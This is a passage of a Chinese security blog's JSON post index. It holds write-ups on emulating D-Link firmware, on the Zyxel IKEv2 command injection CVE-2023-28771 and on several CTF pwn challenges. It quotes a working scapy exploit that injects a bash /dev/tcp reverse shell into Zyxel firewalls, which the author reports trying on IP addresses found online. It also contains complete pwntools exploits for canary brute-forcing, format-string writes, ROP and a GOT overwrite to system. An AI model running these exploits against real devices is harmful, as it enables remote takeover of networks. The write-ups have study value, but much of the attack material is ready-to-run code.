便可以得到一个类似linux系统根目录的文件夹\n这里我们先找到我们需要启动的服务路径和名称。\n根据经验，名称一般和httpd相关所以我们直接搜索httpd相关的文件：\n可以看到在 /usr/sbin目录下有一个lighttpd文件，那么我们可以试一试这个文件：\n首先看一看目标文件的架构：\n可以看到是32位mips的小段\nqemu-user 启动失败 这里我们选择qemu-mipsel-static（qemu-mips-static是大段架构），把qemu复制到dlink的根目录下后，启动http服务：\nsudo ./qemu-mipsel-static -L . ./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd.conf -L .：类似于chroot .\n-D：显示报错信息\n-f ：指定配置文件\n然后我们进行访问：\n发现服务可以访问，但浏览器上什么都没有，同时终端上有报错信息：\n根据报错信息，我们可以大致猜测该问题应该是php相关的服务没有启动（大致猜测（×），百度一下（√））。例如 backend died指的是后端出错了，那么可能是php中的管理后端cgi的服务：fastcgi没有启动\n我们退出qemu，搜索一下php-fastcgi相关的文件：\n这里根据linux目录，可以判断我们需要启动 /etc/init.d/php7-fastcgi。","title":"CVE-2022-46641 D-Link dir-846命令注入漏洞"},{"content":"CVE-2023-28771 合勤IPSec VPN服务命令注入漏洞（未测试通过） 漏洞简介 该漏洞广泛存在于合勤防火墙设备中：\nATP防火墙（固件版本在4.60 至 5.35） USG FLEX（固件版本在4.60至5.35） VPN（固件版本在内4.60至5.35） ZyWALL/USG（固件版本在4.60至4.73） 并在网络上有完整的分析文章：[CVE-2023-28771 RCE分析与EXP](CVE-2023-28771 RCE分析与EXP (qq.com))\n在文章中有给出exp：\n#!/usr/bin/python3\rimport sys\rfrom scapy.all import *\rload_contrib(\u0026#39;ikev2\u0026#39;)\rcmd = \u0026#34;\\\u0026#34;;bash -c \\\u0026#34;exec bash -i \u0026amp;\u0026gt;/dev/tcp/\u0026#34; + sys.argv[2] + \u0026#34;/\u0026#34; + sys.argv[3] + \u0026#34; \u0026lt;\u0026amp;1;\\\u0026#34;;echo -n \\\u0026#34;\u0026#34;\rpacket = IP(dst = sys.argv[1]) / UDP(dport = 500) / IKEv2(init_SPI = RandString(8), next_payload = \u0026#39;Notify\u0026#39;, exch_type = \u0026#39;IKE_SA_INIT\u0026#39;, flags=\u0026#39;Initiator\u0026#39;) / IKEv2_payload_Notify(next_payload = \u0026#39;Nonce\u0026#39;, type = 14, load = \u0026#34;HAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXB\u0026#34; + cmd) / IKEv2_payload_Nonce(next_payload = \u0026#39;None\u0026#39;, load = RandString(68))\rsend(packet) 通过这个exp，可以大概猜测到漏洞出在处理ikev2协议有关\n不过该漏洞没有买到设备，所以只能使用exp去找ip测试。\n寻找特征 固件解密 漏洞的特征我们需要去固件中找，固件则可以直接去官网下载（官网只能下载最近几个版本的固件）\n同时，固件是加密过的zip文件，具体的解密原理：[Zyxel设备固件提取与口令破解](Zyxel设备固件提取与口令破解|NOSEC安全讯息平台 - 白帽汇安全研究院)\n这里直接演示解压的过程。\n官网下载后是一个压缩包，解压后的文件夹如下：\n里面有一个xxx.ri的文件，该文件可以直接通过binwake解压出来，这里面存放着解压xxx.bin的密码\nbinwalk -Me1 473AAAB0C0.ri 解压后可以看到一个zld_fsextract文件，这个文件就是用来解压xxx.bin的二进制文件\n这里我们file看一下这个文件：\n是mips n32的架构，这里我们先将zld_fsextract文件复制到xxx.bin同级目录，然后使用qemu来进行用户级模拟：\n./qemu-mipsn32-static ./zld_fsextract 473AAAB0C0.bin ./unzip -s extract -e code 直接使用qemu模拟的话会报错：\n这里的权限不够不能使用sudo来解决，因为这里需要的是设备的权限，而不是物理机的权限。\n这里我们需要使用strace命令，来看看zld_fsextract文件的执行情况：\nstrace -f -s 199 ./qemu-mipsn32-static ./zld_fsextract 473AAAB0C0.bin ./unzip -s extract -e code 在函数的调用链中，可以看到一个execveat函数。而这个函数参数里的50QLc3QbsoeAX53dREVw8rTxwc5IAYYHa.eD45qyvU8TbD63Td/dUUaR7ilJGJc就是解压密码\n然后使用7z，输入密码，就可以解压：\n这里面有一个compress.img，这个就是根目录系统，直接解压就行：\n比较特征 这里我们选择的是compress\\usr\\local\\zyxel-gui\\htdocs\\images\\login.css\n这个文件里有直接记录当前reset.css版本号，并且可以直接访问：\n通过这一点就可以判断目标ip的固件版本\nip测试 这里直接使用的上面的exp，判断版本号后也无法成功返回shell。并且没有设备，并不知道问题出在哪里\n","permalink":"https://jellyfish-pro.github.io/posts/cve-2023-28771-%E5%90%88%E5%8B%A4ipsec-vpn%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%9C%AA%E6%B5%8B%E8%AF%95%E9%80%9A%E8%BF%87/","summary":"CVE-2023-28771 合勤IPSec VPN服务命令注入漏洞（未测试通过） 漏洞简介 该漏洞广泛存在于合勤防火墙设备中：\nATP防火墙（固件版本在4.60 至 5.35） USG FLEX（固件版本在4.60至5.35） VPN（固件版本在内4.60至5.35） ZyWALL/USG（固件版本在4.60至4.73） 并在网络上有完整的分析文章：[CVE-2023-28771 RCE分析与EXP](CVE-2023-28771 RCE分析与EXP (qq.com))\n在文章中有给出exp：\n#!/usr/bin/python3\rimport sys\rfrom scapy.all import *\rload_contrib(\u0026#39;ikev2\u0026#39;)\rcmd = \u0026#34;\\\u0026#34;;bash -c \\\u0026#34;exec bash -i \u0026amp;\u0026gt;/dev/tcp/\u0026#34; + sys.argv[2] + \u0026#34;/\u0026#34; + sys.argv[3] + \u0026#34; \u0026lt;\u0026amp;1;\\\u0026#34;;echo -n \\\u0026#34;\u0026#34;\rpacket = IP(dst = sys.argv[1]) / UDP(dport = 500) / IKEv2(init_SPI = RandString(8), next_payload = \u0026#39;Notify\u0026#39;, exch_type = \u0026#39;IKE_SA_INIT\u0026#39;, flags=\u0026#39;Initiator\u0026#39;) / IKEv2_payload_Notify(next_payload = \u0026#39;Nonce\u0026#39;, type = 14, load = \u0026#34;HAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXB\u0026#34; + cmd) / IKEv2_payload_Nonce(next_payload = \u0026#39;None\u0026#39;, load = RandString(68))\rsend(packet) 通过这个exp，可以大概猜测到漏洞出在处理ikev2协议有关","title":"CVE-2023-28771 合勤IPSec VPN服务命令注入漏洞"},{"content":"首先拿到文件我们先查看保护机制：\n可以看到，这道题是打开了栈溢出检测的。\n然后我们运行程序（首先要在当前目录下创建一个flag文件，否则会报错）：\n可以看到程序实现了一个类似于客户端的效果。如果我们利用nc指令进行连接的话：\n程序会让我们输入一串字符（这里输入的时aaaa），然后返回Message received!\n然后通过ida我们可以看到程序会打开一个‘./flag’文件：\n这里可以看到，通过read函数，将flag读入到了0x602120这个地址。\n然后在别的地方，我们也可以看到一个send函数，会将0x602120这个地址里的东西发送出去：\n最后我们看到main函数，通过main函数，可以了解到这个程序就是类似于客户端，如果有连接，就会通过fork函数复制一个新的进程，让连接访问这个复制出来的新进程。\n对fork而言，作用相当于自我复制，每一次复制出来的程序，内存布局都是一样的。因为内存布局是一样的，所以canary也一定是一样的。\n爆破canary的基本逻辑为：\n我们知道程序在结束时，会判断canary是否发生改变，如果改变，就会输出**“* stack smashing detected *”，然后程序就会终止。程序终止，在我们客户端上的表现就是，接收不到任何的数据，但是如果canary没有改变，我们客户端就会接收到服务器端发送的Message received!。那么我们就可以通过特征，来对canary进行一位一位的爆破。首先canary的最低为一定为‘\\x00’，所以我们从第二位开始爆破，第二位从\u0026quot;\\x00\u0026quot;开始，逐一增加，如果错误，则接收不到回响，如果正确就接受到Message received!**，所以如果有接收，就爆破下一位。\n假如canary如图：\n我们按位进行爆破：\n那么，我们就可以通过fork函数，对canary进行爆破：\nfrom pwn import *\rcontext.log_level = \u0026#39;debug\u0026#39;\rcanary = b\u0026#34;\\x00\u0026#34;\rpadding = b\u0026#34;a\u0026#34;*264\rfor x in range(7):\rfor y in range(1,0x100):\rp = remote(\u0026#34;127.0.0.1\u0026#34;,10011)\rprint(p.recv())\rp.send(padding+canary+ bytes([y]))\rtry:\rinfo = p.recv()\rprint(info)\rexcept:\rp.close()\rcontinue\rp.close()\rbreak\rcanary += bytes([y])\rprint(\u0026#34;success get blasting!\u0026#34;)\rprint(\u0026#39;type =\u0026#39;,type(canary))\rprint(canary) 这里我们先在本地进行连接，实验一下爆破canary的exp：\n可以看到canary被爆出来了。然后利用这个canary，构造ROP将flag输出出来：\n注： 因为是客户端的问题，所以这里我们需要使用send函数，将flag发送到客户端。\nsend函数会有四个参数：\nextern ssize_t send (int __fd, const void *__buf, size_t __n, int __flags)\r1.__fd：套接字描述符：\r2.__buf：指向想 发送消息/接收消息 数据的缓冲区地址的指针\r3. __n：想要 发送消息/接收消息 缓冲区的最大尺寸\r4.__flags:发送/接收标记(一般设置0) 这里必须要保证__fd的参数和我们客户端服务端的套接字描述一致。这样才能保证我们客户端接收到flag。\n而客户端会给我们显示程序的fd：\n然后我们将fd = 5 使用ROP传递给rdi就可以了\n**注：**这里我重新启动了程序，所以这里的canary和上面爆破出来的不一样\ncanary_local = b\u0026#39;\\x00\\xdb\\x46\\x11\\xa3\\x9b\\x01\\xf7\u0026#39;\rp = remote(\u0026#34;127.0.0.1\u0026#34;,10011)\rpop_rdi_ret = 0x400fe3\rcall_send = 0x400BFE\rsend_addr = 0x400BDD\rpop_rsi_ret = 0x400fe1\rpayload = b\u0026#39;a\u0026#39;*264 + canary_local + b\u0026#39;b\u0026#39;*8 +p64(pop_rdi_ret) + p64(5)+p64(send_addr)\rp.recvuntil(\u0026#39;game!\u0026#39;)\rp.sendline(payload)\rp.recv()\rprint(\u0026#34;recv = \u0026#34;,p.recvuntil(\u0026#34;}\u0026#34;,drop = False))\rp.interactive() 这样就可以接收到我们本地的flag了：\n上面我们在本地接收了flag文件，我们知道，接收到文件需要知道__fd参数，我们才能接收到flag\n但是在远程环境下，我们不知道远程环境的__fd参数。\n这里我们还是先将远程环境的canary给爆破出来：\n但是接下来，我们并不知道远程环境的__fd参数，所以我们只能按个尝试：\ncanary_remote = b\u0026#39;\\x00\\xf7\\xeb\\xfd\\x25\\x58\\x61\\xcd\u0026#39;\rpop_rdi_ret = 0x400fe3\rcall_send = 0x400BFE\rsend_addr = 0x400BDD\rpop_rsi_ret = 0x400fe1\rfor i in range(1,255):\rp = remote(\u0026#34;10.0.25.109\u0026#34;,10011)\rpayload = b\u0026#39;a\u0026#39;*264 + canary_remote + b\u0026#39;b\u0026#39;*8 payload += p64(pop_rdi_ret) + p64(i)+p64(send_addr)\rp.recvuntil(\u0026#39;game!\u0026#39;)\rp.sendline(payload)\rtry:\rp.recv()\rinfo = p.recvuntil(\u0026#34;}\u0026#34;)\rprint(info)\rexcept:\rp.close()\rcontinue\rp.close()\rbreak 这里我们使用了一个循环，从0开始给远程发送消息，直到接收到flag：\n最后的exp：\nfrom pwn import *\rcontext.log_level = \u0026#39;debug\u0026#39;\r\u0026#39;\u0026#39;\u0026#39;\r#爆破canary\rcanary = b\u0026#34;\\x00\u0026#34;\rpadding = b\u0026#34;a\u0026#34;*264\rfor x in range(7):\rfor y in range(1,0x100):\rp = remote(\u0026#34;10.0.25.109\u0026#34;,10011)\rprint(p.recv())\rp.send(padding+canary+ bytes([y]))\rtry:\rinfo = p.recv()\rprint(info)\rexcept:\rp.close()\rcontinue\rp.close()\rbreak\rcanary += bytes([y])\rprint(\u0026#34;success get blasting!\u0026#34;)\rprint(\u0026#39;type =\u0026#39;,type(canary))\rprint(canary)\r\u0026#39;\u0026#39;\u0026#39;\r#挨个尝试fd\rcanary_remote = b\u0026#39;\\x00\\xf7\\xeb\\xfd\\x25\\x58\\x61\\xcd\u0026#39;\rcanary_local = b\u0026#39;\\x00\\xdb\\x46\\x11\\xa3\\x9b\\x01\\xf7\u0026#39;\rpop_rdi_ret = 0x400fe3\rcall_send = 0x400BFE\rsend_addr = 0x400BDD\rpop_rsi_ret = 0x400fe1\rfor i in range(1,255):\rp = remote(\u0026#34;10.0.25.109\u0026#34;,10011)\rpayload = b\u0026#39;a\u0026#39;*264 + canary_remote + b\u0026#39;b\u0026#39;*8 payload += p64(pop_rdi_ret) + p64(i)+p64(send_addr)\rp.recvuntil(\u0026#39;game!\u0026#39;)\rp.sendline(payload)\rtry:\rp.recv()\rinfo = p.recvuntil(\u0026#34;}\u0026#34;)\rprint(info)\rexcept:\rp.close()\rcontinue\rp.close()\rbreak\rp.interactive() ","permalink":"https://jellyfish-pro.github.io/ctf/enumcanary/","summary":"首先拿到文件我们先查看保护机制：\n可以看到，这道题是打开了栈溢出检测的。\n然后我们运行程序（首先要在当前目录下创建一个flag文件，否则会报错）：\n可以看到程序实现了一个类似于客户端的效果。如果我们利用nc指令进行连接的话：\n程序会让我们输入一串字符（这里输入的时aaaa），然后返回Message received!\n然后通过ida我们可以看到程序会打开一个‘./flag’文件：\n这里可以看到，通过read函数，将flag读入到了0x602120这个地址。\n然后在别的地方，我们也可以看到一个send函数，会将0x602120这个地址里的东西发送出去：\n最后我们看到main函数，通过main函数，可以了解到这个程序就是类似于客户端，如果有连接，就会通过fork函数复制一个新的进程，让连接访问这个复制出来的新进程。\n对fork而言，作用相当于自我复制，每一次复制出来的程序，内存布局都是一样的。因为内存布局是一样的，所以canary也一定是一样的。\n爆破canary的基本逻辑为：\n我们知道程序在结束时，会判断canary是否发生改变，如果改变，就会输出**“* stack smashing detected *”，然后程序就会终止。程序终止，在我们客户端上的表现就是，接收不到任何的数据，但是如果canary没有改变，我们客户端就会接收到服务器端发送的Message received!。那么我们就可以通过特征，来对canary进行一位一位的爆破。首先canary的最低为一定为‘\\x00’，所以我们从第二位开始爆破，第二位从\u0026quot;\\x00\u0026quot;开始，逐一增加，如果错误，则接收不到回响，如果正确就接受到Message received!**，所以如果有接收，就爆破下一位。\n假如canary如图：\n我们按位进行爆破：\n那么，我们就可以通过fork函数，对canary进行爆破：\nfrom pwn import *\rcontext.log_level = \u0026#39;debug\u0026#39;\rcanary = b\u0026#34;\\x00\u0026#34;\rpadding = b\u0026#34;a\u0026#34;*264\rfor x in range(7):\rfor y in range(1,0x100):\rp = remote(\u0026#34;127.0.0.1\u0026#34;,10011)\rprint(p.recv())\rp.send(padding+canary+ bytes([y]))\rtry:\rinfo = p.recv()\rprint(info)\rexcept:\rp.close()\rcontinue\rp.close()\rbreak\rcanary += bytes([y])\rprint(\u0026#34;success get blasting!\u0026#34;)\rprint(\u0026#39;type =\u0026#39;,type(canary))\rprint(canary) 这里我们先在本地进行连接，实验一下爆破canary的exp：\n可以看到canary被爆出来了。然后利用这个canary，构造ROP将flag输出出来：","title":"enumcanary"},{"content":"首先我们检查保护机制：\n我们可以看到有canary，可以修改got表。\n这里我们第一反应应该是采用泄露canary和修改got表的办法。\n但是我们运行文件可以发现，程序并不是一个无线循环的程序，意思就是我们虽然可以泄露canary，但是输入canary之后程序就结束了，并不能将canary利用起来。\n由此我们可以知道，这是一个只能使用一次的格式化字符串漏洞。\n然后我们进入IDA查看这个文件：\n我们可以清楚的看到程序的逻辑，就是生成两个随机数后相加，然后与我们输入的字符进行比较，如果相同就给我们shell。\n因为v5和s两个变量是随机生成的数字。所以我们只能通过格式化字符串来修改v2的值。\n我们到GDB中调试查看一下程序具体的流程：\n在memset函数这里初始化了两个栈空间：\n然后两个read函数读取两个随机字符到刚刚初始化的两个栈空间中\n然后程序让我们输入v2字符串，放到栈空间中去：\n然后就是比较我们输入的v2和刚刚两个随机字符的和是否相等：\n程序的流程就是这样了，接下来我们需要了解格式化字符串的一个符号\n%*k$c%x$n %*k$c的含义就是：输出格式化字符串第k个变量个字符。\nx %*k$c%x$n的含义是：将输出格式化字符串第k个变量个字符的个数写入格式化字符串第x个变量指向的地址中\n而在这道题中，我们可以看到两个随机数的偏移量为10和11，而存放v2的栈空间的偏移量为9，所以我们payload为：\npayload = b\u0026#39;%*10$c%*11$c%9$lln\u0026#39; 这样写就表示，先输出第10个偏移量中的值这么多个字符，再输出第11个偏移量中的值这么多个字符，最后将一共输出的字符存放在第九个偏移量中所指向的地址\n完整的exp为：\nfrom pwn import *\r#context.log_level = \u0026#39;debug\u0026#39;\r#p = process(\u0026#39;./format0\u0026#39;)\rp = remote(\u0026#39;10.0.25.109\u0026#39;,20000)\rif args.G:\rgdb.attach(p)\rp.recvuntil(\u0026#39;your name:\u0026#39;)\rpayload = b\u0026#39;%*10$c%*11$c%9$lln\u0026#39;\rp.sendline(payload)\rp.recvuntil(\u0026#39;you shell...\u0026#39;)\rp.sendline(\u0026#39;a\u0026#39;)\rp.interactive() ","permalink":"https://jellyfish-pro.github.io/ctf/format0/","summary":"首先我们检查保护机制：\n我们可以看到有canary，可以修改got表。\n这里我们第一反应应该是采用泄露canary和修改got表的办法。\n但是我们运行文件可以发现，程序并不是一个无线循环的程序，意思就是我们虽然可以泄露canary，但是输入canary之后程序就结束了，并不能将canary利用起来。\n由此我们可以知道，这是一个只能使用一次的格式化字符串漏洞。\n然后我们进入IDA查看这个文件：\n我们可以清楚的看到程序的逻辑，就是生成两个随机数后相加，然后与我们输入的字符进行比较，如果相同就给我们shell。\n因为v5和s两个变量是随机生成的数字。所以我们只能通过格式化字符串来修改v2的值。\n我们到GDB中调试查看一下程序具体的流程：\n在memset函数这里初始化了两个栈空间：\n然后两个read函数读取两个随机字符到刚刚初始化的两个栈空间中\n然后程序让我们输入v2字符串，放到栈空间中去：\n然后就是比较我们输入的v2和刚刚两个随机字符的和是否相等：\n程序的流程就是这样了，接下来我们需要了解格式化字符串的一个符号\n%*k$c%x$n %*k$c的含义就是：输出格式化字符串第k个变量个字符。\nx %*k$c%x$n的含义是：将输出格式化字符串第k个变量个字符的个数写入格式化字符串第x个变量指向的地址中\n而在这道题中，我们可以看到两个随机数的偏移量为10和11，而存放v2的栈空间的偏移量为9，所以我们payload为：\npayload = b\u0026#39;%*10$c%*11$c%9$lln\u0026#39; 这样写就表示，先输出第10个偏移量中的值这么多个字符，再输出第11个偏移量中的值这么多个字符，最后将一共输出的字符存放在第九个偏移量中所指向的地址\n完整的exp为：\nfrom pwn import *\r#context.log_level = \u0026#39;debug\u0026#39;\r#p = process(\u0026#39;./format0\u0026#39;)\rp = remote(\u0026#39;10.0.25.109\u0026#39;,20000)\rif args.G:\rgdb.attach(p)\rp.recvuntil(\u0026#39;your name:\u0026#39;)\rpayload = b\u0026#39;%*10$c%*11$c%9$lln\u0026#39;\rp.sendline(payload)\rp.recvuntil(\u0026#39;you shell...\u0026#39;)\rp.sendline(\u0026#39;a\u0026#39;)\rp.interactive() ","title":"format0"},{"content":"首先我们查看一下保护机制：\n可以看到，这道题是打开了canary保护。之前做stack smaches时，我们了解了如何利用canary溢出报错来打印我们需要的flag。\ncanary检测机制 虽然当时我们了解到，canary检测到溢出之后，会调用stack_chk_fail函数，并且在这个函数里打印字符串。但是，我们当时并没有说明。canary保护是怎么检测到溢出的，现在利用这道题，我们可以了解一下canary检测方式和绕过canary的方法。\n通过IDA我们可以发现，这个函数的功能函数有俩个gets函数：\nv1的大小为30h（48个字节）\n我们知道，gets函数有着溢出的风险，那么通过这俩个gets函数，我们来看一看canary是如何检测溢出的。\n首先我们在gets函数和printf函数处打上断点。\n然后来到第一个gets函数里，步进到_IO_getline函数处：\n这里我们随便输入一个不会产生溢出的值，我输入的为‘as'\n输入之后，利用stack 20指令查看栈空间,找到程序存放‘as’的地方：\n在上面查看IDA时，我们发现存放字符的空间大小为30h（48字节）。那么，在栈空间里，字符可以存放的大小为：48/8=6排。\n可以看到，在图中我们输入的值后的第六排，有一个八个字符、以\\x00结尾的无规律字符串0x9a05e8afeb322300。\n这个八位字符，就是canary生成的检测字符，如果这个字符改变，则canary就会在程序结束时调用stack_chk_fail函数。canary不是固定的，但最后一个字节一定是\\x00。\n我们在gdb里观察一下：\n我们可以正常返回main函数：\n然后我们使用c指令，来到第二个gets函数处，这里我们尝试溢出来改变canary的值。\n可以看到这里canary已经改变了，接着我们接着执行：\n在程序结束时，程序调用了stack_chk_fail函数。\n绕过canary 因为canary保护需要检测canary的值有没有被改变。那么我们在构造payload时，将原本的canary值放到canary本来的地址上，就好了。\n利用printf函数泄露canary值 因为canary每次都不同，意味着我们每次都需要改变canary的值。\n那么如何获得程序中canary的值呢。\n这里我们就可以利用printf函数来进行泄露。\n%n$p //n代表第几个参数，p表示打印的是一个地址。 我们在gdb中查看，canary是第几个参数：\n因为64为前6个参数通过寄存器传递，所以是这里第10个。\n接着我们尝试输入%10$p尝试一下：\n可以看到，并不是canary，而是canary上方的地址，说明我们应该输入%11$p\n构造exp 接下来我们就可以构造exp了：\nsys_addr = 0x4006E7\t//system函数地址\rpayload1 = \u0026#39;%11$p\u0026#39;\rp.sendline(payload1)\rcanary =int( p.recv(18),base = 16)\t//将接收到的canary转化为16进制的int类型\rprint(\u0026#39;canary =\u0026#39;,hex(canary))\rcanary_val = canary.to_bytes(9,\u0026#39;little\u0026#39;)\t//将int类型的canary转为bytes #format1\rfrom pwn import *\r#p = process(\u0026#39;./format1\u0026#39;)\rp = remote(\u0026#39;10.0.25.109\u0026#39;,20000)\ra = 0x400760\rif args.G:\rgdb.attach(p)\rsys_addr = 0x4006E7\rpayload1 = \u0026#39;%11$p\u0026#39;\rp.sendline(payload1)\rcanary =int( p.recv(18),base = 16)\rprint(\u0026#39;canary =\u0026#39;,hex(canary))\rcanary_val = canary.to_bytes(9,\u0026#39;little\u0026#39;)\rpayload2 = b\u0026#39;a\u0026#39;*40 + canary_val + b\u0026#39;b\u0026#39;*7+p64(sys_addr)\rp.send(payload2)\rp.interactive() ","permalink":"https://jellyfish-pro.github.io/ctf/format1/","summary":"首先我们查看一下保护机制：\n可以看到，这道题是打开了canary保护。之前做stack smaches时，我们了解了如何利用canary溢出报错来打印我们需要的flag。\ncanary检测机制 虽然当时我们了解到，canary检测到溢出之后，会调用stack_chk_fail函数，并且在这个函数里打印字符串。但是，我们当时并没有说明。canary保护是怎么检测到溢出的，现在利用这道题，我们可以了解一下canary检测方式和绕过canary的方法。\n通过IDA我们可以发现，这个函数的功能函数有俩个gets函数：\nv1的大小为30h（48个字节）\n我们知道，gets函数有着溢出的风险，那么通过这俩个gets函数，我们来看一看canary是如何检测溢出的。\n首先我们在gets函数和printf函数处打上断点。\n然后来到第一个gets函数里，步进到_IO_getline函数处：\n这里我们随便输入一个不会产生溢出的值，我输入的为‘as'\n输入之后，利用stack 20指令查看栈空间,找到程序存放‘as’的地方：\n在上面查看IDA时，我们发现存放字符的空间大小为30h（48字节）。那么，在栈空间里，字符可以存放的大小为：48/8=6排。\n可以看到，在图中我们输入的值后的第六排，有一个八个字符、以\\x00结尾的无规律字符串0x9a05e8afeb322300。\n这个八位字符，就是canary生成的检测字符，如果这个字符改变，则canary就会在程序结束时调用stack_chk_fail函数。canary不是固定的，但最后一个字节一定是\\x00。\n我们在gdb里观察一下：\n我们可以正常返回main函数：\n然后我们使用c指令，来到第二个gets函数处，这里我们尝试溢出来改变canary的值。\n可以看到这里canary已经改变了，接着我们接着执行：\n在程序结束时，程序调用了stack_chk_fail函数。\n绕过canary 因为canary保护需要检测canary的值有没有被改变。那么我们在构造payload时，将原本的canary值放到canary本来的地址上，就好了。\n利用printf函数泄露canary值 因为canary每次都不同，意味着我们每次都需要改变canary的值。\n那么如何获得程序中canary的值呢。\n这里我们就可以利用printf函数来进行泄露。\n%n$p //n代表第几个参数，p表示打印的是一个地址。 我们在gdb中查看，canary是第几个参数：\n因为64为前6个参数通过寄存器传递，所以是这里第10个。\n接着我们尝试输入%10$p尝试一下：\n可以看到，并不是canary，而是canary上方的地址，说明我们应该输入%11$p\n构造exp 接下来我们就可以构造exp了：\nsys_addr = 0x4006E7\t//system函数地址\rpayload1 = \u0026#39;%11$p\u0026#39;\rp.sendline(payload1)\rcanary =int( p.recv(18),base = 16)\t//将接收到的canary转化为16进制的int类型\rprint(\u0026#39;canary =\u0026#39;,hex(canary))\rcanary_val = canary.to_bytes(9,\u0026#39;little\u0026#39;)\t//将int类型的canary转为bytes #format1\rfrom pwn import *\r#p = process(\u0026#39;./format1\u0026#39;)\rp = remote(\u0026#39;10.0.25.109\u0026#39;,20000)\ra = 0x400760\rif args.","title":"format1"},{"content":"我们首先还是先远程连接一下这个程序：\n发现程序的逻辑为输入什么就输出什么。\n那我们修改一下dump脚本，直接泄露：\nfrom pwn import *\rproc = \u0026#39;./format2\u0026#39;\r#context.log_level = \u0026#39;debug\u0026#39;\rdef leak(b_addr , a):\r#p = process(proc)\rp = remote(\u0026#39;10.0.25.109\u0026#39;,20001)\rb_addr1 = str(hex(b_addr))\rprint(\u0026#39;b_addr1 =\u0026#39;,hex(b_addr))\rif b_addr1[-2:] == \u0026#39;0a\u0026#39;:\rinfo = b\u0026#34;\\x00\u0026#34;\relse:\rpad = b\u0026#39;%7$s.tmp\u0026#39;+p64(b_addr)\r#gdb.attach(p)\rp.sendline(pad)\rp.recvuntil(\u0026#39;me!\u0026#39;)\rp.recvuntil(\u0026#39;\\n\u0026#39;)\rinfo = p.recvuntil(\u0026#39;.tmp\u0026#39;, drop=True)\rif not info :\rinfo = b\u0026#34;\\x00\u0026#34;\rp.close()\rreturn info\rb_addr = 0x400680\rb_end = 0x400a00\rres = b\u0026#39;\u0026#39;\ra = 0\rwhile b_addr\u0026lt;b_end:\rinfo = b\u0026#39;\u0026#39;\rinfo = leak(b_addr,a)\rprint(\u0026#39;leak = \u0026#39;,info)\ra +=1\rb_addr += len(info)\rres += info\rprint(\u0026#39;leak_addr = \u0026#39;,hex(b_addr))\r#print(\u0026#39;res = \u0026#39;,res)\rprint(\u0026#34;dump length is: \u0026#34;, len(res))\rwith open(\u0026#34;dump_file2\u0026#34;, \u0026#34;wb\u0026#34;) as f:\rf.write(res) 然后我们对二进制文件进行观察，可以看到其got表：\n通过偏移量我们可以找到printf函数的got表地址：\n同样知道got表中的printf函数的地址后，我们对其进行泄露\nfrom pwn import *\rcontext.clear(arch = \u0026#39;amd64\u0026#39;)\rcontext.log_level = \u0026#39;debug\u0026#39;\rsh = remote(\u0026#34;10.0.25.109\u0026#34;,20001)\rprintf_got = 0x600d18\rpayload1 = b\u0026#39;%7$saaaa\u0026#39; + p64(printf_got)\rsh.recvuntil(\u0026#39;me!\u0026#39;)\rsh.sendline(payload1)\rleak = u64(sh.recvuntil(\u0026#39;\\x7f\u0026#39;)[-6:].ljust(8,b\u0026#39;\\x00\u0026#39;))\rprint(\u0026#39;leak = \u0026#39;,hex(leak)) 然后查找libc版本：\n可以看到这次的版本比较多，但是因为程序是64位，我们可以排除几个，而剩下的还是需要挨个排查。\n这次运气比较好，第一个版本就是我们需要的版本：\n接下来就是计算基地址和system函数的地址，然后将got表中的printf函数地址改为system函数的地址。这里我们同样用到了\npwnlib.fmtstr.fmtstr_payload 这个工具\nhttps://docs.pwntools.com/en/latest/fmtstr.html?highlight=fmtstr_payload\r//pwntools的说明文档\rhttps://blog.csdn.net/qq_45595732/article/details/115112781?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0.topblog\u0026amp;spm=1001.2101.3001.4242.1\u0026amp;utm_relevant_index=3\r//CSDN上一个简要的使用说明 最后的exp：\n#format2_x64\rfrom pwn import *\rcontext.clear(arch = \u0026#39;amd64\u0026#39;)\rcontext.log_level = \u0026#39;debug\u0026#39;\rsh = remote(\u0026#34;10.0.25.109\u0026#34;,20001)\rprintf_got = 0x600d18\rpayload1 = b\u0026#39;%7$saaaa\u0026#39; + p64(printf_got)\rsh.recvuntil(\u0026#39;me!\u0026#39;)\rsh.sendline(payload1)\rleak = u64(sh.recvuntil(\u0026#39;\\x7f\u0026#39;)[-6:].ljust(8,b\u0026#39;\\x00\u0026#39;))\rprint(\u0026#39;leak = \u0026#39;,hex(leak))\r#%n$p 打印printf第n个参数的值\r#%n$s 以printf第n个参数的值为地址打印其指向的值\rlibc_base = leak - 0x55810\rsys_addr = libc_base + 0x453a0\rprint(\u0026#39;libc_base = \u0026#39;,hex(libc_base))\rprint(\u0026#39;sys_addr = \u0026#39;,hex(sys_addr))\rpayload2 = fmtstr_payload(6, {printf_got: sys_addr},write_size=\u0026#39;short\u0026#39;)\rprint(\u0026#39;payload = \u0026#39;,payload2)\rsh.sendline(payload2)\rsleep(0.2)\rsh.sendline(\u0026#39;/bin/sh\\x00\u0026#39;)\rsh.interactive() ","permalink":"https://jellyfish-pro.github.io/ctf/format2_new/","summary":"我们首先还是先远程连接一下这个程序：\n发现程序的逻辑为输入什么就输出什么。\n那我们修改一下dump脚本，直接泄露：\nfrom pwn import *\rproc = \u0026#39;./format2\u0026#39;\r#context.log_level = \u0026#39;debug\u0026#39;\rdef leak(b_addr , a):\r#p = process(proc)\rp = remote(\u0026#39;10.0.25.109\u0026#39;,20001)\rb_addr1 = str(hex(b_addr))\rprint(\u0026#39;b_addr1 =\u0026#39;,hex(b_addr))\rif b_addr1[-2:] == \u0026#39;0a\u0026#39;:\rinfo = b\u0026#34;\\x00\u0026#34;\relse:\rpad = b\u0026#39;%7$s.tmp\u0026#39;+p64(b_addr)\r#gdb.attach(p)\rp.sendline(pad)\rp.recvuntil(\u0026#39;me!\u0026#39;)\rp.recvuntil(\u0026#39;\\n\u0026#39;)\rinfo = p.recvuntil(\u0026#39;.tmp\u0026#39;, drop=True)\rif not info :\rinfo = b\u0026#34;\\x00\u0026#34;\rp.close()\rreturn info\rb_addr = 0x400680\rb_end = 0x400a00\rres = b\u0026#39;\u0026#39;\ra = 0\rwhile b_addr\u0026lt;b_end:\rinfo = b\u0026#39;\u0026#39;\rinfo = leak(b_addr,a)\rprint(\u0026#39;leak = \u0026#39;,info)\ra +=1\rb_addr += len(info)\rres += 